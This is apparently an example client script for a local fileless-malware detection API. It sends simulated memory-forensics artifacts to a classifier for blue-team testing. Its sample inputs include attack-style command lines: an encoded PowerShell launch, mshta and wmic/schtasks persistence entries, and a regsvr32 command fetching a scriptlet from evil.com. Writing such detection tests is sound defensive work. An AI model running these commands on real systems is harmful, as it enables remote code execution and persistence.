"""
Example Usage: Fileless Malware Detection API
Demonstrates defensive use cases for SOC/Blue Team operations

⚠️  DEFENSIVE USE ONLY - NOT FOR MALWARE CREATION
"""
import requests
import json
import time
from typing import Dict

# API Configuration
API_BASE_URL = "http://127.0.0.1:8000"


def check_health():
    """Check if API is healthy and model is loaded"""
    print("="*60)
    print("🏥 Health Check")
    print("="*60)
    
    response = requests.get(f"{API_BASE_URL}/health")
    health = response.json()
    
    print(f"Status: {health['status']}")
    print(f"Model Loaded: {health['model_loaded']}")
    print(f"Device: {health['device']}")
    print(f"Architecture: {health['model_architecture']}")
    print(f"Version: {health['version']}")
    print()


def example_1_powershell_abuse():
    """Example 1: Detect PowerShell abuse (Pre-operational stage)"""
    print("="*60)
    print("📍 Example 1: PowerShell Abuse Detection")
    print("="*60)
    
    # Suspicious PowerShell activity from memory dump
    memory_artifact = """
    Process: powershell.exe (PID: 4532)
    Command Line: powershell.exe -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA
    Parent: WINWORD.EXE
    Network: Outbound connection to 45.76.128.45:443
    Registry: Modified HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    """
    
    data = {
        "text": memory_artifact,
        "threshold": 0.5
    }
    
    response = requests.post(f"{API_BASE_URL}/detect", json=data)
    result = response.json()
    
    print(f"Input: PowerShell spawned by Word with encoded command")
    print(f"\n🔍 Detection Result:")
    print(f"  Verdict: {result['verdict'].upper()}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Stage: {result['stage_name']} (Stage {result['stage']})")
    print(f"  Tactics: {', '.join(result['tactics'])}")
    print(f"  Inference Time: {result['inference_time_ms']} ms")
    print(f"\n💡 Recommendation:")
    print(f"  {result['recommendation']}")
    print(f"\n🎯 Probabilities:")
    for stage, prob in result['probabilities'].items():
        bar = "█" * int(prob * 50)
        print(f"  {stage:20s} {prob:6.2%} {bar}")
    print()


def example_2_process_injection():
    """Example 2: Detect process injection (Operational stage)"""
    print("="*60)
    print("📍 Example 2: Process Injection Detection")
    print("="*60)
    
    # Memory forensics showing process injection
    memory_artifact = """
    Process: svchost.exe (PID: 1824)
    VAD Protection: PAGE_EXECUTE_READWRITE
    Suspicious: Code injection detected from PID 3456
    Injected Module: Not on disk (fileless)
    API Calls: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
    Network: Connection to 198.51.100.42:8080
    """
    
    data = {
        "text": memory_artifact,
        "threshold": 0.5
    }
    
    response = requests.post(f"{API_BASE_URL}/detect", json=data)
    result = response.json()
    
    print(f"Input: Process injection into svchost.exe")
    print(f"\n🔍 Detection Result:")
    print(f"  Verdict: {result['verdict'].upper()}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Stage: {result['stage_name']} (Stage {result['stage']})")
    print(f"\n⚠️  {result.get('warning', 'No warnings')}")
    print(f"\n💡 Recommendation:")
    print(f"  {result['recommendation']}")
    print()


def example_3_registry_persistence():
    """Example 3: Detect registry-based persistence"""
    print("="*60)
    print("📍 Example 3: Registry Persistence Detection")
    print("="*60)
    
    # Registry modification for persistence
    memory_artifact = """
    Process: mshta.exe (PID: 5672)
    Registry Write: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update
    Value: mshta.exe javascript:eval(new ActiveXObject('WScript.Shell'))
    Parent: explorer.exe
    Execution Path: C:\\Windows\\System32\\mshta.exe
    """
    
    data = {
        "text": memory_artifact,
        "numeric_features": [180, 4.5, 0, 20, 0.15],  # Custom features
        "threshold": 0.5
    }
    
    response = requests.post(f"{API_BASE_URL}/detect", json=data)
    result = response.json()
    
    print(f"Input: mshta.exe modifying Run key with JavaScript")
    print(f"\n🔍 Detection Result:")
    print(f"  Verdict: {result['verdict'].upper()}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Stage: {result['stage_name']}")
    print(f"\n🔎 Common Techniques for this stage:")
    for tech in result['common_techniques']:
        print(f"  • {tech}")
    print()


def example_4_benign_process():
    """Example 4: Benign process (should be classified as benign)"""
    print("="*60)
    print("📍 Example 4: Benign Process Analysis")
    print("="*60)
    
    # Normal Windows Update process
    memory_artifact = """
    Process: svchost.exe (PID: 1024)
    Service: wuauserv (Windows Update)
    Parent: services.exe
    Network: Connection to windowsupdate.microsoft.com:443
    Registry: Read HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate
    Digital Signature: Valid Microsoft signature
    """
    
    data = {
        "text": memory_artifact,
        "threshold": 0.5
    }
    
    response = requests.post(f"{API_BASE_URL}/detect", json=data)
    result = response.json()
    
    print(f"Input: Windows Update service process")
    print(f"\n🔍 Detection Result:")
    print(f"  Verdict: {result['verdict'].upper()}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Stage: {result['stage_name']}")
    
    if result['verdict'] == 'benign':
        print(f"  ✅ Correctly identified as benign")
    print()


def example_5_get_stage_info():
    """Example 5: Get information about attack stages"""
    print("="*60)
    print("📍 Example 5: Attack Stage Information")
    print("="*60)
    
    response = requests.get(f"{API_BASE_URL}/stages")
    stages = response.json()
    
    for stage_id, info in stages.items():
        print(f"\n🎯 Stage {stage_id}: {info['stage_name']}")
        print(f"   Description: {info['description']}")
        print(f"   Tactics: {', '.join(info['tactics'])}")
        print(f"   Example Techniques:")
        for tech in info['typical_techniques'][:3]:
            print(f"     • {tech}")
    print()


def example_6_get_technique_details():
    """Example 6: Get details about specific MITRE technique"""
    print("="*60)
    print("📍 Example 6: MITRE ATT&CK Technique Details")
    print("="*60)
    
    technique_id = "T1059.001"
    response = requests.get(f"{API_BASE_URL}/techniques/{technique_id}")
    
    if response.status_code == 200:
        technique = response.json()
        print(f"\n🎯 Technique: {technique_id}")
        print(f"   Name: {technique['name']}")
        print(f"   Tactic: {technique['tactic']}")
        print(f"   Description: {technique['description']}")
        print(f"   Detection: {technique['detection']}")
    print()


def example_7_memory_forensics_workflow():
    """Example 7: Complete memory forensics workflow"""
    print("="*60)
    print("📍 Example 7: Memory Forensics Workflow")
    print("="*60)
    
    # Simulated Volatility output analysis
    suspicious_processes = [
        {
            "name": "cmd.exe spawning PowerShell with base64",
            "data": "cmd.exe -> powershell.exe -enc JABhAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgA"
        },
        {
            "name": "WMI process creating scheduled task",
            "data": "wmic.exe process call create 'schtasks /create /sc onlogon /tn Update /tr C:\\\\temp\\\\update.bat'"
        },
        {
            "name": "Suspicious DLL injection into explorer.exe",
            "data": "explorer.exe VAD: PAGE_EXECUTE_READWRITE, injected code from unknown source"
        }
    ]
    
    print("\n🔬 Analyzing suspicious processes from memory dump...\n")
    
    malicious_count = 0
    for i, proc in enumerate(suspicious_processes, 1):
        print(f"Process {i}: {proc['name']}")
        
        response = requests.post(
            f"{API_BASE_URL}/detect",
            json={"text": proc['data'], "threshold": 0.6}
        )
        result = response.json()
        
        print(f"  → {result['verdict'].upper()} ({result['confidence']:.2%})")
        
        if result['verdict'] == 'malicious':
            malicious_count += 1
            print(f"  ⚠️  Stage: {result['stage_name']}")
            print(f"  🎯 Tactics: {', '.join(result['tactics'][:2])}")
        print()
    
    print(f"📊 Summary: {malicious_count}/{len(suspicious_processes)} processes flagged as malicious\n")


def performance_benchmark():
    """Benchmark inference performance"""
    print("="*60)
    print("📊 Performance Benchmark")
    print("="*60)
    
    test_samples = [
        "powershell.exe -encodedcommand ...",
        "mshta.exe javascript:eval(...)",
        "regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll",
        "cmd.exe /c schtasks /create /sc onlogon",
        "normal windows update process"
    ] * 10  # 50 samples total
    
    print(f"\nTesting with {len(test_samples)} samples...")
    
    start_time = time.time()
    
    for sample in test_samples:
        response = requests.post(
            f"{API_BASE_URL}/detect",
            json={"text": sample, "threshold": 0.5}
        )
    
    total_time = time.time() - start_time
    avg_time = (total_time / len(test_samples)) * 1000  # ms
    
    print(f"✅ Total time: {total_time:.2f}s")
    print(f"✅ Average per request: {avg_time:.2f}ms")
    print(f"✅ Throughput: {len(test_samples)/total_time:.2f} requests/sec")
    print()


def main():
    """Run all examples"""
    print("\n" + "="*60)
    print("🛡️  FILELESS MALWARE DETECTION API - USAGE EXAMPLES")
    print("="*60)
    print("Purpose: DEFENSIVE BLUE TEAM OPERATIONS ONLY")
    print("="*60 + "\n")
    
    try:
        # Check API health
        check_health()
        
        # Run examples
        example_1_powershell_abuse()
        example_2_process_injection()
        example_3_registry_persistence()
        example_4_benign_process()
        example_5_get_stage_info()
        example_6_get_technique_details()
        example_7_memory_forensics_workflow()
        performance_benchmark()
        
        print("="*60)
        print("✅ All examples completed successfully!")
        print("="*60)
        print("\n📚 Next Steps:")
        print("  1. Integrate with your SIEM/SOC platform")
        print("  2. Connect to memory forensics pipeline (Volatility)")
        print("  3. Set up automated alerting for high-confidence detections")
        print("  4. Review API logs: tail -f fileless_detector_api.log")
        print("\n⚠️  Remember: Use for DEFENSIVE purposes only!")
        print()
        
    except requests.exceptions.ConnectionError:
        print("❌ Error: Cannot connect to API")
        print("   Make sure the server is running:")
        print("   python app.py")
    except Exception as e:
        print(f"❌ Error: {e}")


if __name__ == "__main__":
    main()
